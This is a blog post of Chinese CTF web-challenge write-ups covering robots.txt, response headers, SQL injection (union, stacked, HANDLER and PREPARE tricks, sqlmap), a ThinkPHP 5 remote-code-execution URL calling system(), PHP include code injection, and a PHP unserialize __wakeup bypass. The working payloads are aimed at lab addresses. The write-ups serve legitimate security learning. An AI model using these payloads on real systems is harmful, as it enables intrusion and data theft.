---
layout:       post
title:        "Web进阶区Writeup及思路总结"
subtitle:     "Null"
date:         2020-02-23 11:10:12
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: false
tags:
    - Sec
    - WebSec
    - Writeup
---


# 1. Training-WWW-Robots
**题目描述**：暂无

**WP**:
> **【原理】**  
> robots.txt  
>   
> **【目的】**  
> 学习robots.txt  
>   
> **【环境】**  
> windows  
>   
> **【工具】**  
> 浏览器  
>   
> **【步骤】**  
> 输入/robots.txt  
> 然后打开fl0g.php就可以看到flag:wWwrobots  
>   
> **【总结】**  
> robots.txt是一种君子协议  

**总结**：谢谢出题人的安慰。2020.2.23.Sun

---

# 2. baby_web
**题目描述**：想想初始页面是哪个

**WP**:
> **【实验原理】**  
> web请求头中的`location`作用  
>   
> **【实验目的】**  
> 掌握web响应包头部常见参数  
>   
> **【实验环境】**  
> Windows  
>   
> **【实验工具】**  
> firefox  
>   
> **【实验步骤】**  
> 1. 根据提示，在url中输入index.php,发现打开的仍然还是1.php
> 2. 打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到`location`参数被设置了1.php，并且得到flag。

**总结**：index.php的响应头如下
```http
Connection: Keep-Alive
Content-Length: 17
Content-Type: text/html; charset=UTF-8
Date: Sun, 23 Feb 2020 03:15:42 GMT
FLAG: flag{very_baby_web}
Keep-Alive: timeout=5, max=100
Location: 1.php
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.21
```
页面自动跳转可能是因为设置了响应的`Location`头，线索可能在响应头里。2020.2.23.Sun

---

# 3. NewsCenter
**题目来源**： XCTF 4th-QCTF-2018  
**题目描述**：如题目环境报错，稍等片刻刷新即可  

**WP**:
> **目标**  
> 简单的SQL注入，读取`information_schema`元数据，然后读取flag。
sqlmap 也可解。
> 
> **环境**  
> windows
> 
> **工具**  
> sqlmap
> 
> **分析过程**
> 1. 初步探测,发现搜索框存在注入
>       ```sql
>       ' union select 1,2,3 #
>       ```
> 2. 获取数据库名，表名
>       ```sql
>       ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #
>       ```
> 3. 获取news表的字段名，数据类型
>       ```sql
>       ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#
>       ```
> 4. 获取f1agfl4gher3字段名 数据类型
>       ```sql
>       ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
>       ```
> 5. 得到flag
>       ```sql
>       ' and 0 union select 1,2,fl4g from secret_table #
>       ```
> 
> sqlmap版本
> 1. 获取注入点
>       ```bash
>       sqlmap -u http://192.168.100.161:53459 --data "search=df"
>       ```
> 2. 获取数据库信息
>       ```sh
>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
>       ```
> 3. 获取库内表信息
>       ```sh
>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
>       ```
> 4. 获取表内字段信息
>       ```bash
>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
>       ```
> 5. 获取字段内容，得到flag
>       ```sh
>       sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump
>       ```

**总结**：

手动注入：
1. 单引号找注入点，闭合单引号、用`#`或“`-- `”（两杠后须有空格）注释
2. ```order by```测字段数
3. union select ```information_schema.columns```中的```table_schema```（数据库名）和```tabel_name```（表名），前面加```and 0```清除正常查询出的内容
4. union select ```information_schema.columns```中的```column_name```和```data_type```获取指定表的字段名和数据类型
5. 查表获得flag

SQLMAP使用：
* ```-u``` 指定目标url
* ```--data``` 指定请求体数据
* ```-dbs``` 获取数据库列表
* ```-D``` 指定数据库
* ```--tables``` 获取表列表
* ```-T``` 指定表
* ```--columns``` 获取字段列表
* ```-C``` 指定字段（字段名要加双引号）
* ```--dump``` 获取指定字段的值

2020.2.24.Mon

---


# 4. php_rce

**题目来源**：暂无  
**题目描述**：暂无

**WP**:
> **原理**  
> ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。
> 
> **目的**  
> 掌握框架漏洞
> 
> **环境**  
> Windows
> 
> **工具**  
> firefox
> 
> **步骤**
> 1. 根据主页提示，可以发现网页使用的是ThinkPHP框架，版本为5.1
> 2. 此版本存在getshell漏洞（百度一下poc一抓一大把）
> 3. 查找flag  
> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22
> 4. 查看flag  
> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag

**总结**：奇怪的知识盲区增加了，看来php框架也得学一下；flag文件还有可能在根目录等，最好用find搜索一下  2020.7.16.Thu

---


# 5. Web_php_include

**题目来源**：XTCTF  
**题目描述**：暂无

**WP**:
> **原理**  
> php文件包含
> 
> **目的**  
> 了解如何利用php文件包含
> 
> **环境**  
> Windows
> 
> **工具**  
> chrome
> 
> **步骤**
> 1. 审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
> 2. 默认页面为http://127.0.0.1/index.php,设置为page值，可确保while为真
> 3. 利用hello参数将执行内容显示  
> ```
> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E
> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E
> ```


**总结**：
1. 本题中先利用被echo的参数把要执行的PHP代码输出到当前页面上（记得带上```<?php ?>```或```<? ?>```），再用被include的参数来包含当前页面；
2. ```strstr```（判断字符串中是否包含某子串）可用大小写绕过；
3. ```file_get_contents```不行的时候可尝试```show_source```
4. include的url要包含协议
5. 可通过`phpinfo`查看`system`之类的敏感函数是否被禁用  2020.7.31.Fri

---


# 6. supersqli

**题目来源**：强网杯 2019  
**题目描述**：随便注

**WP**:
> **环境**  
> windows
> 
> **工具**  
> Firefox
> 
> **步骤**  
> 先添加一个单引号，报错，错误信息如下：
> 
> ```
> error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1  
> ```
> 
> 接着测试```--+```注释，发现被过滤，然后使用```#```注释，可行 用```order by```语句判断出有两个字段，接着使用```union select```爆字段，发现这个时候出现了如下提示：
> 
> ```php
> return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
> ```
> 
> 发现上面的关键字都被过滤不能使用了，没法进行注入，这个时候尝试一下堆叠注入
> 
> 现在回到这道题，利用堆叠注入，查询所有数据库：
> 
> ```sql
> 1';show databases;#
> ```
> 
> 查询所有表:
> 
> ```sql
> 1';show tables;#
> ```
> 
> 查询words表中所有列:
> 
> ```sql
> 1';show columns from words;#
> ```
> 
> 查询1919810931114514表中所有列
> 
> ```sql
> 1';show columns from `1919810931114514`;#      #(字符串为表名操作时要加反引号)
> ```
> 
> 根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id
> 
> 这道题没有禁用```rename```和```alert```，所以我们可以采用修改表结构的方法来得到flag 将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段
> 
> ```sql
> 1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#
> ```
> 
> 这段代码的意思是将words表名改为words1，1919810931114514表名改为words，将现在的words表中的flag列名改为id 然后用```1' or 1=1 #```得到flag

**总结**：
1. **堆叠注入（Stacked injections）**：分号结束原语句后插入新语句  
    * 优点：在查询处也能执行增删改等其他语句
    * 适用条件：
        * MySQL：
            * PHP中使用```mysqli_query()```时不可用
            * PHP中使用```mysqli_multi_query()```时可用
        * MS SQL Server可用，可执行存储过程
        * Oracle不可用
        * 没有相应的权限限制
4. 过滤了```select```之类的关键词的话，看有没有过滤```rename```和```alert```，如果没有则尝试通过修改表名、表结构（字段）来使用默认的查询来获取数据（要一次完成，否则默认查询表不存在会一直报错，无法继续修改）
5. 过滤了`select`的话，还可尝试用`handler`读表：  
[@jesseyoung《mysql查询语句-handler》（blog.csdn.net/JesseYoung/article/details/40785137）](https://blog.csdn.net/JesseYoung/article/details/40785137)
    ```sql
    1'; HANDLER `1919810931114514` OPEN; HANDLER `1919810931114514` READ FIRST #
    ```
6. 过滤了关键字的时候，可以尝试`concat`查询字符串然后`prepare`再`execute`：  
[@GeaoZhang《MySQL的SQL预处理(Prepared)》（cnblogs.com/geaozhang/p/9891338.html）](https://www.cnblogs.com/geaozhang/p/9891338.html)
    ```sql
    1';SET @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1; #
    ```
    PHP的`strstr`可尝试大小写绕过，`stristr`才忽略大小写  
2. 最后记得注释掉后面的语句
3. 语句中的表名是数字时要加反引号  2020.8.3.Mon

---


# 7. unserialize3

**题目来源**：暂无  
**题目描述**：暂无

**WP**:
> **原理**  
> PHP反序列化漏洞：执行`unserialize()`时，先会调用`__wakeup()`。  
> 当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过`__wakeup()`。
> 
> **目的**  
> 了解绕过常见的函数过滤机制
> 
> **环境**  
> linux
> 
> **工具**  
> chrome
> 
> **步骤**  
> 1. 打开题目，进行代码审计，可以看到xctf类只拥有一个public的flag变量，值为111。
> 
> 2. public属性序列化后格式为：  
>       ```php
>       数据类型:属性名长度:"属性名";数据类型:属性值长度:"属性值";
>       ```
> 
> 3. 本题目中，只存在一个变量，正常情况下序列化后，如下所示。  
>       ```php
>       O:4:"xctf":1:{s:4:"flag";s:3:"111";}
>       ```
> 
> 4. 将设置属性值为2，可导致反序列化异常，如下所示。  
>       ```php
>       O:4:"xctf":2:{s:4:"flag";s:3:"111";}
>       ```
> 
> 4. 根据代码中的`?code=`可得知，将得到的序列化字符串赋值给code进行传递。
> 
> 5. 访问
>       ```
>       http://111.198.29.45:34517?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
>       ```
>       得到flag，如图所示。

**总结**：
1. 对象序列化后格式：
    ```php
    O:类名长度:"类名":public属性个数:{s:public属性名长度:"属性名";数据类型:属性值长度:"属性值";s:public属性名长度:"属性名";数据类型:属性值长度:"属性值";}
    ```
1. 执行`unserialize()`时，当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过`__wakeup()`
2. 本题中将最前面表示对象类型的`O`改成小写`o`或者改各个长度和类型字段也行  2020.8.26.Wed


_//未完待xu_